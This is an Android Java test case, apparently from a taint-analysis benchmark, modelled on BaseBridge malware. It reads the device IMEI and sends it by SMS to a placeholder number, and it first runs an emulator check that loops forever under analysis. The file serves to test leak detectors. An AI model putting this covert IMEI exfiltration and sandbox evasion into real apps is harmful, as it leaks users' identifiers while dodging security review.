
package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
/**
 * @testcase_name Manufacter and SDK version
 * Inspired by 096_BaseBridge-f8c3a32abf4ea4ea94ee5dc3c75801c90c6e1145/com/keji/fixedposition/BaseAActivity.java:127
 */
public class ManufacterAndSDK extends Activity {
	@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d("IBM", "start");
        setContentView(R.layout.manufacter_sdkversion);
		
        String imei = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId(); //source
	
        aCheck();
        
		SmsManager sms = SmsManager.getDefault();
		Log.d("IBM", "sending SMS: "+imei);
		sms.sendTextMessage("+49 1234", null, imei, null, null);  //sink
		Log.d("IBM", "end");
    }
	
	private void aCheck(){
        int i1 = Integer.parseInt(Build.VERSION.SDK);
        Log.d("IBM", "version SDK: "+i1);
        Log.d("IBM", "Manufacturer: "+Build.MANUFACTURER);
        if ((!Build.MANUFACTURER.toLowerCase().startsWith("samsung")) && (i1 < 8)) {
        	return;
        }
        for (;;){
           if (!Build.MANUFACTURER.toLowerCase().startsWith("unknown")) {
        	  break;
           }
        }
        return;
		}
}
